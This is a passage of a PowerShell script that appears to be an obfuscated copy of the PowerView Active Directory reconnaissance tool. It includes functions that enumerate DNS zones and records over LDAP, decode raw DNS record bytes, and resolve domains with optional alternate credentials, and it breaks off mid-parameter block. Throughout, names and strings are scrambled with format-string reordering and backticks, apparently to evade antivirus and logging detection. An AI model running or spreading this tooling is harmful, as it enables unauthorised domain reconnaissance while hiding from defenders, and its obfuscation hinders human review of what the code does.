            if (${PSBoUNDP`ARaM`Et`ErS}[("{0}{1}{2}" -f'T','ombston','e')]) {
                ${s`Ea`RCHEr}."t`OMB`sToNe" = ${tR`Ue}
            }

            if (${ps`BoUNd`ParA`M`E`TERS}[("{0}{3}{2}{1}"-f'LD','r','lte','APFi')]) {
                ${s`EAr`CHeR}."F`I`lTeR" = ${lD`ApFi`lt`Er}
            }

            if (${Ps`BOUnDp`AR`AMEtE`RS}[("{1}{2}{0}"-f'Masks','Se','curity')]) {
                ${SEAR`CH`er}."s`Ec`U`RItYmaSks" = Switch (${seCUr`itYM`A`SKs}) {
                    ("{0}{1}"-f 'D','acl') {  ( varIAblE ("{1}{0}"-f '8V','txg'))."VA`LuE"::"dA`CL" }
                    ("{1}{0}" -f 'roup','G') {   ${TX`G8V}::"Gr`OUP" }
                    ("{0}{1}"-f 'Non','e') {  (  vARiaBLE  ('txg8'+'V') -VAlueOnl)::"No`Ne" }
                    ("{1}{0}"-f 'er','Own') {  ${Tx`G8V}::"O`WNer" }
                    ("{1}{0}"-f'l','Sac') {   (  gcI  ("{0}{2}{3}{4}{1}" -f 'vaR','xG8V','IA','BLe',':t')  )."V`ALUe"::"sa`Cl" }
                }
            }

            if (${ps`BoU`NDpArA`mE`TeRs}[("{2}{0}{1}" -f 'erti','es','Prop')]) {
                
                ${PRO`PE`RT`iestOL`oaD} = ${PrOpErt`I`eS}| &("{1}{3}{0}{2}"-f 'j','ForEac','ect','h-Ob') { ${_}.("{1}{0}"-f 'lit','Sp').Invoke(',') }
                ${n`Ull} = ${s`EA`RcHER}."PRopErTIe`sto`LO`Ad".("{2}{0}{1}"-f 'dRang','e','Ad').Invoke((${P`ROP`ERTiest`oLO`AD}))
            }
        }

        ${SeARC`her}
    }
}


function Conv`ErT-D`Ns`REcORD {


    [OutputType({"{7}{1}{8}{9}{5}{4}{0}{10}{3}{2}{6}"-f 'tomation.PSCus','st','jec','b','agement.Au','n','t','Sy','e','m.Ma','tomO'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITION = 0, MandaTORY = ${t`RUe}, VAlUeFROmPIPElInebypRopErtYName = ${Tr`Ue})]
        [Byte[]]
        ${DN`sRec`o`Rd}
    )

    BEGIN {
        function GET`-name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{4}{5}{2}{3}" -f'PSUs','eO','o','rrectly','utputTyp','eC'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${R`Aw}
            )

            [Int]${Len`gTH} = ${r`AW}[0]
            [Int]${S`E`GMents} = ${R`AW}[1]
            [Int]${In`DEX} =  2
            [String]${n`AmE}  = ''

            while (${s`egMeN`TS}-- -gt 0)
            {
                [Int]${s`EG`m`EN`TLengTH} = ${r`AW}[${In`dex}++]
                while (${sEg`me`NT`lENg`TH}-- -gt 0) {
                    ${N`AME} += [Char]${R`Aw}[${I`NDeX}++]
                }
                ${N`Ame} += "."
            }
            ${NA`mE}
        }
    }

    PROCESS {
        
        ${Rda`Ta`Type} =  (  VARiaBLe  ("D"+"9x8") -vAlUe)::("{1}{0}{2}"-f 'UI','To','nt16').Invoke(${D`NSr`ECoRD}, 2)
        ${uP`DA`TedAtSe`RiaL} =   ${d9`x8}::("{2}{0}{1}" -f 'oUI','nt32','T').Invoke(${DN`SrE`CO`RD}, 8)

        ${tTlr`AW} = ${dnSR`e`CORD}[12..15]

        
        ${n`Ull} =   ${v`hAS}::("{0}{1}" -f 'Reve','rse').Invoke(${t`TL`RAw})
        ${t`TL} =  (  GI ("{1}{0}{2}"-f'R','va','iable:D9x8')  )."vA`lue"::("{0}{1}{2}" -f'ToU','Int','32').Invoke(${tt`LR`Aw}, 0)

        ${a`GE} =  ( GeT-iTEM  ("{1}{2}{0}"-f 'LE:D9x8','Va','RIab') )."v`AluE"::("{1}{2}{0}"-f '2','ToUInt','3').Invoke(${d`Ns`ReCORd}, 20)
        if (${A`ge} -ne 0) {
            ${T`i`me`sTamp} = ((&("{0}{1}{2}"-f'Get','-Dat','e') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{1}{0}" -f'ours','AddH').Invoke(${A`ge})).("{0}{1}"-f'To','String').Invoke()
        }
        else {
            ${TiMe`STa`MP} = ("{0}{1}"-f '[stat','ic]')
        }

        ${DNsR`e`c`ORDObjE`ct} = &("{0}{2}{1}"-f 'New','ct','-Obje') ("{0}{1}{2}" -f 'P','SObje','ct')

        if (${r`d`ATaTy`Pe} -eq 1) {
            ${I`p} = "{0}.{1}.{2}.{3}" -f ${d`NsR`ecOrD}[24], ${D`NSrEc`ORD}[25], ${dN`sr`EcoRD}[26], ${DNs`RE`COrd}[27]
            ${DA`Ta} = ${iP}
            ${DNSR`eCorDO`BJeCt} | &("{0}{1}{2}"-f'Add-M','em','ber') ("{3}{1}{0}{2}" -f 'pe','otepro','rty','N') ("{0}{1}{2}"-f 'R','ecordTy','pe') 'A'
        }

        elseif (${RDatA`T`Y`PE} -eq 2) {
            ${NS`N`Ame} = &("{2}{1}{0}" -f'-Name','et','G') ${DnSREc`O`RD}[24..${dNs`R`ecoRD}."Le`NGth"]
            ${d`ATa} = ${NsN`AMe}
            ${DNs`RecOR`D`Obj`ECt} | &("{1}{3}{0}{2}" -f '-Mem','A','ber','dd') ("{1}{0}{2}" -f 'pr','Note','operty') ("{2}{0}{1}" -f 'ordT','ype','Rec') 'NS'
        }

        elseif (${r`datAt`yPe} -eq 5) {
            ${A`LiAs} = &("{1}{0}{2}"-f '-Nam','Get','e') ${d`N`sreco`Rd}[24..${d`NsrecO`Rd}."LEn`GtH"]
            ${D`ATA} = ${ALi`As}
            ${D`NsR`ecOrdo`Bject} | &("{1}{0}{2}" -f 'mb','Add-Me','er') ("{1}{0}{2}"-f 'tepr','No','operty') ("{0}{2}{1}" -f'Recor','pe','dTy') ("{0}{1}" -f'CN','AME')
        }

        elseif (${rDA`TaT`y`pe} -eq 6) {
            
            ${D`Ata} = $( ( get-VAriAble  ('dh'+'3TrM'))."VA`lue"::"tObA`se`64st`RIng"(${Dn`Sr`EcORD}[24..${dN`Sre`CORD}."LEN`G`Th"]))
            ${dNS`RecO`RDO`BJE`CT} | &("{1}{2}{0}" -f'-Member','Ad','d') ("{1}{3}{2}{0}"-f 'ty','Notep','per','ro') ("{1}{2}{0}" -f'Type','Reco','rd') 'SOA'
        }

        elseif (${r`d`AtaTypE} -eq 12) {
            ${p`TR} = &("{0}{1}"-f'Get-Na','me') ${DNSRe`co`Rd}[24..${dNSRe`cO`RD}."L`eN`gtH"]
            ${d`ATA} = ${p`Tr}
            ${dNSR`ecoRd`ob`JE`CT} | &("{2}{0}{1}" -f '-Me','mber','Add') ("{3}{2}{1}{0}" -f 'erty','teprop','o','N') ("{1}{2}{0}" -f'e','RecordTy','p') 'PTR'
        }

        elseif (${rdA`T`A`TYpE} -eq 13) {
            
            ${dA`Ta} = $(  ${DH3`Trm}::"tO`B`ASE64`StrING"(${DNSr`e`Cord}[24..${Dnsr`E`COrD}."L`ENGth"]))
            ${dn`SREcOrD`oBJ`EcT} | &("{2}{0}{1}{3}" -f 'dd-','Me','A','mber') ("{0}{1}{2}{3}" -f 'No','teprop','e','rty') ("{0}{2}{1}{3}"-f'R','rdT','eco','ype') ("{0}{1}"-f'HI','NFO')
        }

        elseif (${rdA`T`ATyPE} -eq 15) {
            
            ${D`ATA} = $(  ${DH`3`TRm}::"to`BA`se64S`T`Ring"(${d`Nsr`EcOrd}[24..${dNsr`E`CORd}."LE`Ng`TH"]))
            ${dNsRE`C`ORd`OBje`ct} | &("{2}{0}{1}"-f 'd','d-Member','A') ("{2}{1}{0}"-f'y','propert','Note') ("{1}{0}{2}{3}" -f 'ec','R','ordTyp','e') 'MX'
        }

        elseif (${Rd`AT`Atype} -eq 16) {
            [string]${T`XT}  = ''
            [int]${SEg`me`Ntl`EngTh} = ${DnS`REco`Rd}[24]
            ${InD`eX} = 25

            while (${Seg`MeNtl`eN`gth}-- -gt 0) {
                ${t`XT} += [char]${d`N`SR`ECOrD}[${i`ND`Ex}++]
            }

            ${dA`TA} = ${t`xT}
            ${d`N`sre`coRd`OBjecT} | &("{0}{2}{1}" -f'Add','r','-Membe') ("{1}{0}{2}"-f'prope','Note','rty') ("{2}{0}{1}"-f 'ordT','ype','Rec') 'TXT'
        }

        elseif (${rdAt`A`T`Ype} -eq 28) {
            
            ${D`Ata} = $( (  get-vArIaBLe  ("{1}{0}" -f 'H3tRm','d')  )."Va`LuE"::"TObaSe`6`4strI`Ng"(${D`NS`RecOrd}[24..${d`NSRE`C`oRD}."LE`NgTH"]))
            ${d`NSR`ECordO`BjECT} | &("{2}{1}{0}"-f 'er','emb','Add-M') ("{2}{0}{1}"-f'prop','erty','Note') ("{1}{0}{2}" -f 'ordTyp','Rec','e') ("{0}{1}" -f'A','AAA')
        }

        elseif (${RDATa`T`ype} -eq 33) {
            
            ${d`ATA} = $(  ${dh`3`TRm}::"T`Obas`E`64s`TRiNg"(${DNS`REC`O`Rd}[24..${dNSR`EC`Ord}."leng`TH"]))
            ${dNsR`ecoR`dOBJ`ect} | &("{0}{2}{1}" -f 'A','r','dd-Membe') ("{1}{0}{3}{2}" -f 'ope','Notepr','y','rt') ("{3}{0}{2}{1}" -f'rdTy','e','p','Reco') 'SRV'
        }

        else {
            ${D`ATA} = $(  (  variabLe  ("{0}{1}" -f 'dH3','trM') -ValUeON )::"TOB`AsE6`4STr`ING"(${dns`Reco`Rd}[24..${DN`s`R`eCOrd}."l`eNg`Th"]))
            ${d`NS`REcOrd`Ob`jECT} | &("{2}{1}{0}"-f 'ber','-Mem','Add') ("{2}{1}{0}{3}"-f'eprop','ot','N','erty') ("{0}{1}{2}"-f 'Record','Typ','e') ("{1}{0}" -f'WN','UNKNO')
        }

        ${dNsreCOR`do`BJeCt} | &("{3}{0}{1}{2}" -f'dd-','M','ember','A') ("{1}{0}{2}" -f 'propert','Note','y') ("{0}{1}{2}"-f'Update','dAt','Serial') ${upDaTed`Atse`R`IaL}
        ${d`Nsrec`oRD`obje`ct} | &("{2}{1}{0}"-f'ber','m','Add-Me') ("{0}{1}{2}" -f'N','oteprope','rty') 'TTL' ${t`Tl}
        ${dnSR`ecOr`do`Bj`eCt} | &("{1}{0}{2}"-f 'dd-Memb','A','er') ("{1}{2}{3}{0}"-f 'ty','N','otepro','per') 'Age' ${a`gE}
        ${DnsR`e`c`orDO`BJect} | &("{2}{1}{0}" -f 'er','b','Add-Mem') ("{3}{2}{0}{1}"-f'epr','operty','t','No') ("{0}{2}{1}" -f 'Time','tamp','S') ${ti`ME`StAmP}
        ${DnS`R`ECORdOBj`eCt} | &("{0}{2}{1}{3}"-f'Ad','emb','d-M','er') ("{1}{3}{0}{2}" -f'p','Notepr','erty','o') ("{0}{1}" -f'D','ata') ${DA`TA}
        ${dns`R`Ec`oRD`OBJE`CT}
    }
}


function GEt-Do`m`AIndN`sz`oNE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}" -f 'ouldProces','Sh','PS','s'}, '')]
    [OutputType({"{1}{0}{3}{4}{2}" -f 'View.DNS','Power','e','Zo','n'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTioN = 0, vALuEfROMpIpeliNe = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{4}{1}{3}" -f'inC','ro','Doma','ller','ont'})]
        [String]
        ${Se`RVER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`Oper`TieS},

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsuLTpAG`ES`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERv`eRT`imE`Li`miT},

        [Alias({"{0}{2}{1}"-f'Re','urnOne','t'})]
        [Switch]
        ${f`iN`dOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`e`dentiAL} =  (gEt-chilDiTem  ("{3}{2}{1}{0}" -f 'Tq02','7','bLE:','vARIA') )."V`ALue"::"E`MPty"
    )

    PROCESS {
        ${searChE`R`ARGu`mE`N`TS} = @{
            ("{0}{2}{3}{1}" -f 'LDA','er','PF','ilt') = (("{1}{2}{6}{5}{4}{3}{0}" -f'e)','(','ob','dnsZon','ass=','l','jectC'))
        }
        if (${PsbOUn`D`pARam`EterS}[("{0}{2}{1}" -f'Dom','n','ai')]) { ${sEA`R`C`hER`ARguMentS}[("{1}{0}" -f 'ain','Dom')] = ${D`o`mAIN} }
        if (${PsB`O`UnDP`A`Ram`etERS}[("{0}{1}{2}" -f 'Ser','v','er')]) { ${SEa`RC`HErA`RGUmeNTS}[("{1}{0}"-f'ver','Ser')] = ${sE`R`VEr} }
        if (${psb`oundpA`R`AMEteRs}[("{2}{1}{0}"-f 'rties','rope','P')]) { ${sE`Ar`che`RaRgUmEnTs}[("{0}{2}{1}" -f 'Pr','s','opertie')] = ${p`RopeRT`IES} }
        if (${PSBOUNdPa`R`A`meTeRs}[("{3}{1}{2}{0}"-f'e','ultP','ageSiz','Res')]) { ${sEAR`chERA`RGUMe`Nts}[("{2}{0}{1}"-f 'PageS','ize','Result')] = ${reSUlTP`A`ge`s`izE} }
        if (${PsBO`U`N`DPARamETerS}[("{0}{1}{3}{2}"-f'S','er','eLimit','verTim')]) { ${SearChE`RAR`g`UmENts}[("{1}{4}{3}{2}{0}"-f 'it','S','Lim','verTime','er')] = ${se`RV`eRtIMeLIM`IT} }
        if (${pSb`oun`dpA`RAMete`Rs}[("{1}{0}{2}" -f'ntia','Crede','l')]) { ${S`EARC`HE`R`ARg`UMents}[("{2}{0}{1}{3}" -f 'e','de','Cr','ntial')] = ${CR`e`DenTI`Al} }
        ${dn`sS`E`ArCher1} = &("{0}{3}{4}{1}{2}" -f'G','h','er','et-Do','mainSearc') @SearcherArguments

        if (${DN`S`seARchE`R1}) {
            if (${P`sbO`UNDPa`R`Ame`TeRS}[("{0}{1}{2}" -f 'Fi','n','dOne')]) { ${R`e`sULts} = ${dNSS`EARC`Her1}.("{1}{0}"-f'ne','FindO').Invoke()  }
            else { ${RE`sU`ltS} = ${D`NSSeArC`HEr1}.("{1}{0}"-f 'l','FindAl').Invoke() }
            ${RE`s`UlTS} | &("{1}{0}{2}"-f'bjec','Where-O','t') {${_}} | &("{1}{2}{0}{3}"-f'ch','For','Ea','-Object') {
                ${O`Ut} = &("{4}{2}{0}{3}{1}"-f 'DAPPr','y','ert-L','opert','Conv') -Properties ${_}."PRop`E`RTieS"
                ${o`Ut} | &("{1}{0}{2}" -f '-Me','Add','mber') ("{2}{1}{0}"-f 'y','ert','NoteProp') ("{0}{2}{1}"-f 'Zone','e','Nam') ${O`UT}."N`AMe"
                ${O`Ut}."p`SObJ`EcT"."T`ypEna`meS".("{0}{1}" -f 'I','nsert').Invoke(0, ("{2}{4}{3}{0}{1}" -f'S','Zone','Po','iew.DN','werV'))
                ${o`UT}
            }

            if (${R`EsUL`TS}) {
                try { ${rEsU`lTS}.("{0}{2}{1}" -f 'dis','ose','p').Invoke() }
                catch {
                    &("{1}{0}{2}"-f 'ite-Ve','Wr','rbose') ('[Get-Doma'+'i'+'nDFSSha'+'re]'+' '+'Err'+'or'+' '+'d'+'i'+'sposing '+'o'+'f '+'th'+'e '+'Resu'+'l'+'ts '+'objec'+'t: '+"$_")
                }
            }
            ${DN`ssE`ARcH`er1}.("{0}{2}{1}" -f'disp','e','os').Invoke()
        }

        ${s`Ea`RchE`RARG`U`mENtS}[("{2}{4}{3}{1}{0}{5}" -f'f','e','Sear','BasePr','ch','ix')] = ("{2}{1}{10}{5}{3}{4}{7}{6}{0}{8}{9}"-f 'on','oso','CN=Micr',',DC=','Doma','S','sZ','inDn','e','s','ftDN')
        ${DnS`s`eArCHe`R2} = &("{2}{1}{0}{3}"-f 'rch','et-DomainSea','G','er') @SearcherArguments

        if (${DNSs`EA`RchEr2}) {
            try {
                if (${P`sboU`NdPaRAmEtE`Rs}[("{1}{2}{0}"-f'e','Find','On')]) { ${rES`U`lTs} = ${DNs`Sea`Rc`HER2}.("{0}{2}{1}" -f 'F','ndOne','i').Invoke() }
                else { ${rE`SUlTs} = ${d`NsS`E`AR`cHER2}.("{1}{0}"-f 'l','FindAl').Invoke() }
                ${RE`SUl`TS} | &("{1}{2}{0}{3}" -f 'e-O','Whe','r','bject') {${_}} | &("{2}{1}{0}" -f 'ct','ach-Obje','ForE') {
                    ${o`Ut} = &("{4}{2}{0}{3}{1}" -f'rt-L','ty','nve','DAPProper','Co') -Properties ${_}."PR`OPEr`TIes"
                    ${o`UT} | &("{1}{2}{0}" -f 'er','Add-Mem','b') ("{2}{3}{0}{1}"-f'r','ty','NoteP','rope') ("{0}{1}{2}" -f 'Z','oneNa','me') ${o`Ut}."Na`Me"
                    ${O`Ut}."PsOBJ`e`ct"."tYPEn`A`mES".("{1}{2}{0}"-f 't','I','nser').Invoke(0, ("{4}{1}{0}{2}{3}"-f'Z','ew.DNS','on','e','PowerVi'))
                    ${O`UT}
                }
                if (${res`UlTs}) {
                    try { ${rE`suL`Ts}.("{1}{0}{2}" -f 'i','d','spose').Invoke() }
                    catch {
                        &("{0}{1}{3}{2}" -f 'Wri','te-V','ose','erb') ('['+'Ge'+'t'+'-DomainDN'+'SZo'+'ne] '+'Er'+'ror '+'dis'+'posi'+'ng '+'o'+'f '+'th'+'e '+'Resul'+'ts '+'obj'+'ect'+': '+"$_")
                    }
                }
            }
            catch {
                &("{0}{2}{1}{3}"-f'Write','Verbos','-','e') ((("{19}{5}{8}{21}{9}{18}{0}{20}{6}{13}{15}{12}{3}{4}{16}{10}{11}{7}{14}{2}{1}{17}"-f 'ne] Erro','nes','Zo','softDNS,','DC=','Ge','ccessing {0','n','t-D','DNSZ','oma','inD','icro','}CN=','s','M','D','{0}','o','[','r a','omain'))-f [char]39)
            }
            ${DNSS`EA`RC`Her2}.("{0}{1}"-f'dispos','e').Invoke()
        }
    }
}


function get`-`doMA`inDn`sreCord {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}{4}"-f'P','S','roc','ShouldP','ess'}, '')]
    [OutputType({"{2}{4}{0}{1}{3}" -f'w.DNSReco','r','Power','d','Vie'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitiON = 0,  maNdATory = ${tR`UE}, VaLueFrompiPelINE = ${TR`UE}, VALuEfRompIpeLINebyPRopeRtYNAMe = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${zOn`eNamE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}{4}" -f'rol','o','D','mainCont','ler'})]
        [String]
        ${sEr`VER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRo`p`ErTIeS} = ("{1}{3}{11}{12}{7}{8}{6}{9}{10}{2}{4}{5}{0}"-f'anged','n','creat','ame,','ed',',whench','e','name,d','nsr','cord,w','hen','distingu','ished'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSulT`PAGesi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ErveRt`I`Me`lI`MIt},

        [Alias({"{2}{0}{1}"-f'n','One','Retur'})]
        [Switch]
        ${fin`D`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDE`N`T`ial} =   (  GeT-vARIabLe  ("7T"+"q02"))."vA`LUe"::"Emp`TY"
    )

    PROCESS {
        ${SeArc`HEra`R`gumenTs} = @{
            ("{2}{0}{1}" -f'te','r','LDAPFil') = (("{5}{4}{0}{6}{1}{2}{3}" -f's=dn','Nod','e',')','bjectClas','(o','s'))
            ("{3}{0}{2}{4}{1}" -f'h','Prefix','B','Searc','ase') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${pSBOUN`dPaRA`M`eTeRS}[("{2}{0}{1}" -f 'i','n','Doma')]) { ${SEa`R`CHERArGU`MEnTS}[("{0}{1}" -f'Doma','in')] = ${d`oMAin} }
        if (${P`sb`OuNdP`ARAm`etERs}[("{0}{1}"-f'Se','rver')]) { ${S`Ea`RCher`ArgUMEN`Ts}[("{2}{1}{0}" -f 'ver','r','Se')] = ${SE`RvER} }
        if (${PSBOun`dPa`RAM`etErs}[("{1}{2}{0}"-f 'ies','Prope','rt')]) { ${S`EAR`CHer`ARgUm`eNtS}[("{1}{0}{2}" -f'roperti','P','es')] = ${pRop`eR`Ties} }
        if (${PSbOuN`DPAR`A`METErs}[("{4}{3}{2}{0}{1}"-f 'Si','ze','ge','Pa','Result')]) { ${s`e`ARCh`eRarG`UMENts}[("{0}{2}{3}{1}" -f 'Resu','Size','ltPag','e')] = ${R`ESULTp`Ag`EsIzE} }
        if (${Ps`B`ound`p`ArAmeterS}[("{0}{3}{2}{1}" -f'Ser','imit','rTimeL','ve')]) { ${SeA`RCH`E`RARguMenTs}[("{0}{1}{4}{3}{2}" -f 'Se','rve','Limit','Time','r')] = ${s`eRvErTIME`LiMIT} }
        if (${psbO`U`N`DPar`AmeTE`Rs}[("{0}{2}{1}{3}"-f 'C','nt','rede','ial')]) { ${s`earc`heRA`RGUmENts}[("{0}{2}{1}" -f 'Crede','al','nti')] = ${Cre`D`enTI`Al} }
        ${DNs`s`Ea`RCheR} = &("{4}{5}{3}{0}{1}{2}" -f'i','nSear','cher','ma','Get-','Do') @SearcherArguments

        if (${dnss`E`Arc`Her}) {
            if (${p`S`B`ouNdpaRAmEt`ERs}[("{0}{1}"-f'FindO','ne')]) { ${resU`l`TS} = ${dNSSear`cH`ER}.("{0}{1}"-f 'Fin','dOne').Invoke() }
            else { ${RE`SUL`TS} = ${D`NsSEa`RCH`eR}.("{0}{1}" -f 'FindAl','l').Invoke() }
            ${RE`s`Ults} | &("{2}{0}{1}"-f'ere-Objec','t','Wh') {${_}} | &("{1}{2}{3}{0}"-f 'ct','ForEa','ch-Ob','je') {
                try {
                    ${o`UT} = &("{3}{1}{0}{4}{6}{5}{2}" -f 'nver','o','y','C','t','opert','-LDAPPr') -Properties ${_}."pr`operT`IES" | &("{0}{1}{2}"-f 'Se','lect-Obje','ct') ("{1}{0}"-f 'ame','n'),("{3}{4}{2}{5}{0}{1}"-f 'm','e','edn','disti','nguish','a'),("{1}{2}{0}" -f 'd','dn','srecor'),("{1}{0}{2}"-f'encreat','wh','ed'),("{1}{3}{0}{2}" -f 'enchang','w','ed','h')
                    ${o`UT} | &("{0}{1}{3}{2}" -f'Ad','d-M','r','embe') ("{3}{0}{1}{2}"-f'o','te','Property','N') ("{2}{1}{0}" -f 'eName','on','Z') ${ZoN`EN`AMe}

                    
                    if (${O`Ut}."d`NS`RecORD" -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        ${r`ec`ord} = &("{1}{0}{3}{2}" -f 'S','Convert-DN','d','Recor') -DNSRecord ${O`UT}."dnsReco`Rd"[0]
                    }
                    else {
                        ${r`eC`oRD} = &("{2}{3}{1}{0}" -f 'd','ecor','Con','vert-DNSR') -DNSRecord ${O`Ut}."DnSRE`Co`RD"
                    }

                    if (${R`eC`OrD}) {
                        ${r`ec`Ord}."pSObj`E`ct"."proPErt`I`es" | &("{2}{0}{3}{1}" -f 'rE','-Object','Fo','ach') {
                            ${O`Ut} | &("{2}{1}{0}" -f'ber','d-Mem','Ad') ("{0}{2}{3}{1}"-f 'NotePro','y','pe','rt') ${_}."N`Ame" ${_}."VAl`UE"
                        }
                    }

                    ${O`Ut}."PSOb`Je`cT"."TYPena`m`Es".("{1}{0}" -f'rt','Inse').Invoke(0, ("{2}{3}{4}{1}{0}" -f 'rd','eco','PowerVie','w.DN','SR'))
                    ${o`UT}
                }
                catch {
                    &("{0}{3}{1}{2}{4}" -f 'Wr','e-','W','it','arning') ('['+'G'+'et-Domai'+'n'+'DNS'+'R'+'ecord] '+'Erro'+'r: '+"$_")
                    ${o`Ut}
                }
            }

            if (${R`e`SUlTs}) {
                try { ${RE`sultS}.("{2}{0}{1}" -f 'os','e','disp').Invoke() }
                catch {
                    &("{3}{0}{1}{2}"-f 'ite-V','erbos','e','Wr') ('[Ge'+'t-Do'+'mainDNSR'+'ec'+'ord'+'] '+'Erro'+'r '+'di'+'sp'+'osing'+' '+'o'+'f '+'th'+'e '+'Resul'+'ts'+' '+'o'+'bjec'+'t: '+"$_")
                }
            }
            ${DNSseAr`c`h`er}.("{1}{0}{2}"-f 'o','disp','se').Invoke()
        }
    }
}


function GEt`-Do`m`AIn {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(posiTION = 0, VAluEFRoMPIpeline = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`maIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdEntI`AL} =  ( chILDiteM ("{0}{1}{2}{4}{3}" -f 'V','A','r','7tQ02','IaBle:'))."v`ALue"::"emP`Ty"
    )

    PROCESS {
        if (${PsBouN`d`paRa`metErs}[("{2}{1}{0}" -f'tial','en','Cred')]) {

            &("{2}{3}{0}{1}" -f '-V','erbose','Wri','te') ("{11}{4}{3}{9}{1}{0}{2}{12}{7}{6}{8}{5}{10}" -f 'na','r','t','-Domain] U','Get','ials for Get-D','den','re','t','sing alte','omain','[','e c')

            if (${PSBO`U`NdpArAM`EtERs}[("{1}{0}"-f'in','Doma')]) {
                ${tA`RGetdo`m`A`iN} = ${dO`mA`in}
            }
            else {
                
                ${tARGEtD`Om`AIN} = ${C`REDe`Nti`Al}.("{6}{2}{4}{3}{0}{5}{1}" -f 'en','l','etN','red','etworkC','tia','G').Invoke()."Do`mA`in"
                &("{2}{0}{3}{1}"-f 'r','e','W','ite-Verbos') ('['+'Get-Do'+'mai'+'n] '+'E'+'xtra'+'cted '+'dom'+'ain '+"'$TargetDomain' "+'fro'+'m '+'-Creden'+'ti'+'al')
            }

            ${do`maIN`cONte`XT} = &("{2}{0}{1}" -f'-Obje','ct','New') ("{11}{8}{13}{2}{12}{1}{10}{3}{5}{0}{7}{6}{4}{9}" -f'or','or','irectoryServi','.Dire','x','ct','nte','yCo','em','t','y','Syst','ces.ActiveDirect','.D')(("{1}{0}" -f 'ain','Dom'), ${TarG`eTDoM`AiN}, ${cr`EdE`NtIal}."USeRn`AME", ${C`REDENti`AL}.("{0}{1}{3}{2}" -f'Ge','t','ential','NetworkCred').Invoke()."P`ASsW`oRd")

            try {
                 ${H`zo}::("{2}{0}{1}"-f 'tDoma','in','Ge').Invoke(${Do`maIn`cONT`Ext})
            }
            catch {
                &("{1}{2}{3}{0}"-f'ose','Wr','ite-Ver','b') ('[Get-D'+'omain'+'] '+'T'+'he '+'spe'+'cified'+' '+'do'+'mai'+'n '+"'$TargetDomain' "+'do'+'es '+'no'+'t '+'exist,'+' '+'coul'+'d '+'n'+'ot '+'b'+'e '+'co'+'ntacte'+'d,'+' '+'the'+'r'+'e '+('i'+'sn{'+'0}t ')  -f  [CHAR]39+'a'+'n '+'exis'+'ti'+'ng'+' '+'tru'+'s'+'t, '+'or'+' '+'t'+'he '+'spe'+'cifie'+'d '+'c'+'r'+'ed'+'entials '+'ar'+'e '+'i'+'nvalid: '+"$_")
            }
        }
        elseif (${PsBoUndPA`Rame`T`E`RS}[("{2}{0}{1}"-f'm','ain','Do')]) {
            ${dOm`AIncON`T`EXt} = &("{1}{0}{2}" -f 'jec','New-Ob','t') ("{7}{5}{10}{6}{3}{9}{11}{13}{4}{1}{12}{0}{8}{2}"-f'ory.DirectoryC','eDi','ntext','ctorySer','v','yst','ire','S','o','vic','em.D','es.A','rect','cti')(("{1}{2}{0}" -f 'n','Do','mai'), ${D`oma`IN})
            try {
                 (  vaRIaBle  ("HZ"+"O") )."VaL`Ue"::("{1}{2}{0}" -f 'in','Ge','tDoma').Invoke(${do`mAi`NCOn`T`exT})
            }
            catch {
                &("{3}{2}{1}{0}" -f'e','s','rbo','Write-Ve') ('['+'Ge'+'t-Doma'+'in] '+'T'+'he '+'spec'+'if'+'ied '+'d'+'omain '+"'$Domain' "+'d'+'oes '+'not'+' '+'e'+'xis'+'t, '+'c'+'ould'+' '+'n'+'ot '+'b'+'e '+'c'+'ontacted'+', '+'or'+' '+'the'+'re '+('isn'+'R'+'X2t ')."R`EPLACe"(([ChaR]82+[ChaR]88+[ChaR]50),[STRING][ChaR]39)+'an'+' '+'exis'+'t'+'i'+'ng '+'tr'+'us'+'t '+': '+"$_")
            }
        }
        else {
            try {
                 (  gCi  ('v'+'aR'+'iAblE:h'+'Zo') )."VAl`Ue"::("{3}{2}{1}{4}{0}"-f'n','rentDo','etCur','G','mai').Invoke()
            }
            catch {
                &("{1}{0}{2}"-f 'rit','W','e-Verbose') ('[Get'+'-Domain]'+' '+'Error'+' '+'re'+'triev'+'ing '+'th'+'e '+'cu'+'rrent '+'do'+'main'+': '+"$_")
            }
        }
    }
}


function geT-dOmAIn`COnt`Ro`llER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f'PSS','houldPro','s','ces'}, '')]
    [OutputType({"{4}{3}{1}{2}{0}" -f'er','ew','.Comput','owerVi','P'})]
    [OutputType({"{5}{2}{8}{10}{0}{7}{12}{3}{9}{1}{6}{11}{4}" -f's.','.Do','s','re','er','Sy','mainContr','A','tem.DirectorySe','ctory','rvice','oll','ctiveDi'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTiOn = 0, valUEFROMPIPelinE = ${Tr`UE})]
        [String]
        ${D`om`AIN},

        [ValidateNotNullOrEmpty()]
